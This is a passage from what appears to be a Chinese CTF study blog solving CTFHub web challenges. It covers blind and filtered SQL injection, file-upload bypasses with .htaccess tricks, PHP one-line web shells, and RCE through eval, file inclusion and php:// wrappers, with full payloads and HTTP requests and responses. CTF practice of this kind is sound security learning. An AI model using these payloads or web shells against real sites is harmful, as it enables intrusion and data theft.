class="line"></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables</span><br><span class="line"> <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"># (不断改变范围，把第二张数据表的第三个字母猜解出来)</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line"># 最后得到表名为flag</span><br></pre></td></tr></table></figure>

<ul>
<li>猜测flag表的字段数</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(column_name) <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>)<span class="operator">=</span><span class="number">1</span></span><br><span class="line"></span><br><span class="line"># 得到flag只有一个字段</span><br></pre></td></tr></table></figure>

<ul>
<li>猜测字段名</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line">#(不断改变范围，把字段名猜解出来)</span><br><span class="line">#......</span><br><span class="line">#得到字段名也为flag</span><br></pre></td></tr></table></figure>

<ul>
<li>猜测flag</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sqli.flag <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>),<span class="number">3</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">110</span></span><br><span class="line"></span><br><span class="line">#......</span><br><span class="line">#这是一个巨大的工作量，所以应该积累到的一个经验是：</span><br><span class="line">#手工盲注特别繁琐，碰到这类题目要会用工具sqlmap</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4><span id="mysql结构">MySQL结构</span></h4><h4><span id="时间盲注">时间盲注</span></h4><p>原理和布尔盲注差不多，通过返回时间来判断</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((substr(database(),<span class="number">1</span>,<span class="number">1</span>)=&#x27;s&#x27;),sleep(<span class="number">1</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<h4><span id="cookie注入">cookie注入</span></h4><p>首先通过抓包，发现浏览器返回cookie: id&#x3D;1</p>
<p>使用postman进行发包处理</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span> # <span class="number">1</span>和<span class="number">2</span>均可回显，说明数据库有两行</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>；# 查看页面回显位，发现<span class="number">1</span>，<span class="number">2</span>都可以进行回显</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> version(),database() # 开始注入，获取数据库版本和数据库名 </span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span> # 因为数据库版本大于<span class="number">5.0</span>，所以我们可以通过查询information_schema表来获取表名和列名，获得表名称为gdctsoiitj</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(column_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;gdctsoiitj&#x27;</span> # 得到表名后，继续查询列名，获得列名称为zrxzhzkosa</span><br><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> zrxzhzkosa,<span class="number">2</span> <span class="keyword">from</span> gdctsoiitj # 得到列名后，查询数据得到flag，需要注意这题的表名和列名每个环境都不一样</span><br></pre></td></tr></table></figure>

<ul>
<li><p>为什么id&#x3D;-1而不是1</p>
<blockquote>
<pre><code> 1. 经过查阅资料得知，数据库中id的数据类型设置为int（数值类型）就会出现这种情况，如果数据库检查到id的参数并不为数值的话，就会发生类型转换
 2. 本题ID=1，我想注入的时候就不能再注ID=1了(要查询数据库不存在的结果，否则存在的结果占位显示我们就看不到第二行的数据)
 3. 用联合查询语句union select语句来注入，从而判断显示位,同时也是判断注入点，此时要先保证之前的数据查不出来才能判断注入位置，不然就会一直在注入当前的数据库，无法注入新的值来判断注入点，之后再union select id=-1数据不存在数据库中，可以看到位置2可以插入SQL语句。
</code></pre>
<p>总结一下：<br>比如字符串’1’会被转换为1</p>
<p>比如字符串’1”‘会被转换为1</p>
<p>比如’1 and 1&#x3D;1’会被识别为1</p>
<p>比如’1 and 1&#x3D;2’会被识别为1</p>
<p>比如’1akbucbdadbaiudadbabdaud’会被识别为1</p>
<p>比如’23adasuasdai32ansoiha’会被识别为23</p>
<p>字符串中数字后面的字符可以是任意的，类型转换时都会被忽略，不会对数值有任何的影响</p>
</blockquote>
</li>
<li><p>为什么要用到<code>group_concat</code></p>
<blockquote>
<p>因为需要在一行输出所有的结果</p>
</blockquote>
</li>
</ul>
<h4><span id="ua注入">UA注入</span></h4><ul>
<li>和cookie注入流程一致</li>
</ul>
<h4><span id="referer注入">Referer注入</span></h4><ul>
<li>和cookie注入流程一致</li>
</ul>
<h4><span id="过滤空格">过滤空格</span></h4><p>随着黑客技术的提升，我们开发人员的防护措施也越来越多，为了防止sql注入，开发人员通常会在后台过滤某些非正常用户输入的字符，例如union、select、单引号双引号等等。</p>
<ul>
<li>可以通过&#x2F;**&#x2F;来代替空格</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> # 发现被过滤了</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="operator">=</span><span class="comment">/**/</span><span class="number">1</span> # 发现正确，继续构造payload语句，发现等于<span class="number">2</span>时回显错误，说明此题存在过滤空格注入</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">2</span> # 查看有几位</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span> # 发现无回显，需要加负号操作</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span> # 成功发现回显</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,version() # 发现回显位</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,database()</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(schema_name)<span class="keyword">from</span><span class="comment">/**/</span>information_schema.schemata # 查看所有数据库</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span><span class="string">&#x27;sqli&#x27;</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span>table_name<span class="operator">=</span><span class="string">&#x27;lqsyncyuso&#x27;</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(nuyietobbn)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sqli.lqsyncyuso</span><br></pre></td></tr></table></figure>

<h3><span id="文件上传">文件上传</span></h3><ul>
<li>tips: MacBook上有个坑，上传隐藏文件时候需要配合命令<code>command+shift+.</code></li>
</ul>
<h4><span id="无验证">无验证</span></h4><ol>
<li>通过Wappalyzer来查看当前页面的基础环境，如中间件，前后端语言等 </li>
<li>将一句话木马上传到服务器</li>
</ol>
<ul>
<li>php的一句话木马</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(@<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>通过中国蚁剑进行控制，找到flag</li>
</ol>
<h4><span id="前端验证">前端验证</span></h4><ul>
<li>和无验证差不多，唯一的区别是前端检查了我们上传的文件名。</li>
</ul>
<ol>
<li>禁用js来解决</li>
<li>使用burpsuite，先将一句话木马后缀修改成.png，然后抓包后缀修改成php，从而达到攻击的目的</li>
</ol>
<h4><span id="htaccess">.htaccess</span></h4><blockquote>
<p>htaccess 文件是 Apache 服务器中的一个配置文件，它负责相关目录下的网页配置。通过 htaccess 文件，可以帮我们实现：网页 301 重定向、自定义 404 错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
</blockquote>
<ol>
<li><p>使用 FilesMatch 命令生成一个.htaccess 文件进行上传，绕过白名单中的漏洞</p>
<ul>
<li><p>需要构造.htaccess文件，其中<code>FilesMatch</code> 就是我们要上传的文件</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> &quot;<span class="attr">payload</span>&quot;&gt;</span></span><br><span class="line"> SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>上传一句话木马，名字为FilesMatch设置的<code>payload</code></p>
</li>
</ul>
</li>
<li><p>使用passthru执行外部命令</p>
<ul>
<li>第一步一样是构造.htaccess文件</li>
<li>第二步，使用passthru执行外部命令</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;ls /var/www/&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后通过浏览器访问<code>http://xxxx/upload/payload</code>来执行命令</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">passthru</span>(<span class="string">&quot;cat /var/www/html/flag_828011517.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>添加.htaccess文件</p>
<ul>
<li>句话的作用是：让jpg文件中的php语句执行，这句语句放到.htaccess文件中，Apache运行的时候会解析这个文件中的配置，检测到这句话以后，jpg文件中的php语句才会执行</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<ul>
<li>上传一句话木马，以.jpg结尾</li>
<li>使用蚁剑进行连接</li>
</ul>
</li>
</ol>
<h4><span id="mime">MIME</span></h4><ul>
<li>上传php文件，并将content-type改成image&#x2F;png即可</li>
</ul>
<h4><span id="文件头检查">文件头检查</span></h4><p>原理：服务器会检查png的头格式</p>
<ul>
<li><p>截图上传文件，通过<code>burpsuite</code>进行代理</p>
</li>
<li><p>在图片后面添加一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>修改文件后缀.php</p>
</li>
<li><p>使用蚁剑连接</p>
</li>
</ul>
<h4><span id="00截断">00截断</span></h4><p><strong>%00的使用是在路径上</strong></p>
<p>就是在.php文件后加上%00后接.jpg，这里我们就可以绕过对php文件的过滤。在执行时，%00会把后面的.jpg截断，所以执行的时候他执行的仍然是前面的.php文件。就可以实现我们的马子文件的执行。</p>
<h4><span id="双写后缀">双写后缀</span></h4><p>原理：服务器会替换后缀’php’-&gt;’’，因此我们只需要拼接后缀为”pphphp”即可</p>
<h3><span id="rce">RCE</span></h3><h4><span id="eval执行">eval执行</span></h4><p>进入后题目</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>尝试在URL中带上名为cmd的参数：（此处<code>system()</code>函数的作用为执行系统命令并输出执行结果）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.../?cmd=system(&quot;pwd&quot;);</span><br></pre></td></tr></table></figure>

<p>执行成功 此处需要注意参数结尾一定不能省略<code>;</code>，满足PHP语法才可以执行成功。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.../?cmd=system(&quot;ls%20/&quot;);</span><br><span class="line">.../?cmd=system(&quot;cat%20/flag_xxxx&quot;);</span><br></pre></td></tr></table></figure>

<h4><span id="文件包含">文件包含</span></h4><ul>
<li>考察<code>include</code>函数</li>
</ul>
<p>访问shell页面，发现有一句话木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;ctfhub&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>假如在index.php中include了一个文件，那么不管这个文件后缀是什么  这个文件中的内容将会直接出现在index.php中，所以这道题的payload构造思路就是把shell.txt里的内容想办法放到index.php中去根据源码构造payload：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=shell.txt</span><br></pre></td></tr></table></figure>

<p>直接使用蚁剑后缀加上payload即可</p>
<h4><span id="phpx2fx2finput">php:&#x2F;&#x2F;input</span></h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51295677/article/details/123462929">参考文献</a></p>
<p>常用到伪协议的<code>php://input</code>和<code>php://filter</code>.其中<code>php://input</code>要求<code>allow_url_include</code>设置为<code>On</code></p>
<ul>
<li>使用burp suite的repeater发送请求，构造请求报文</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-9144f5dff97c39a1.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>35</span><br><span class="line"></span><br><span class="line"><span class="language-php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag_5734&quot;</span>);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>得到返回</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 06 Apr 2023 08:05:02 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>113</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">ctfhub</span><span class="template-variable">&#123;8c628d8ea62d6dc8316f15c3&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">i don&#x27;t have shell, how to get flag? <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;phpinfo.php&quot;</span>&gt;</span>phpinfo<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>

<h4><span id="读取源代码">读取源代码</span></h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61839115/article/details/128593214">参考</a></p>
<ul>
<li>考点：<code>php://filter</code>可以作为一个中间流来处理其他流，具有四个参数。</li>
</ul>
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
<td>指定了你要筛选过滤的数据流。</td>
<td>必选</td>
</tr>
<tr>
<td>read&#x3D;&lt;读链的筛选列表&gt;</td>
<td>可以设定一个或多个过滤器名称，以管道符（</td>
<td>）分隔。</td>
</tr>
<tr>
<td>write&#x3D;&lt;写链的筛选列表&gt;</td>
<td>可以设定一个或多个过滤器名称，以管道符（</td>
<td>）分隔。</td>
</tr>
<tr>
<td>&lt;；两个链的筛选列表&gt;</td>
<td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td>
<td></td>
</tr>
</tbody></table>
<p>这道题就直接构造payload了</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/resource=/flag</span><br></pre></td></tr></table></figure>

<p>有些比赛赛题情况下还要用base64输出</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=<span class="built_in">convert</span>.base64-encode/resource=/flag </span><br></pre></td></tr></table></figure>

<p>使用burp suite</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?file=php://filter/resource=/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-d9e9d5fbc32a97fe.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>

<p>返回</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>openresty/1.19.3.2</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Thu, 06 Apr 2023 08:34:10 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>106</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">X-Powered-By</span><span class="punctuation">: </span>PHP/5.6.40</span><br><span class="line"><span class="attribute">Vary</span><span class="punctuation">: </span>Accept-Encoding</span><br><span class="line"><span class="attribute">Access-Control-Allow-Origin</span><span class="punctuation">: </span>*</span><br><span class="line"><span class="attribute">Access-Control-Allow-Headers</span><span class="punctuation">: </span>X-Requested-With</span><br><span class="line"><span class="attribute">Access-Control-Allow-Methods</span><span class="punctuation">: </span>*</span><br><span class="line"></span><br><span class="line"><span class="language-dust"><span class="language-xml">ctfhub</span><span class="template-variable">&#123;d797f76a6ac67e494a84fa86&#125;</span><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">i don&#x27;t have shell, how to get flag? <span class="tag">&lt;<span class="name">br</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-dust">flag in <span class="tag">&lt;<span class="name">code</span>&gt;</span>/flag<span class="tag">&lt;/<span class="name">code</span>&gt;</span></span></span></span><br></pre></td></tr></table></figure>

<h4><span id="远程包含">远程包含</span></h4><ul>
<li>解法1：和input那题解法一样</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?file=php://input</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge-795660de70a9ad8e.sandbox.ctfhub.com:10800</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span 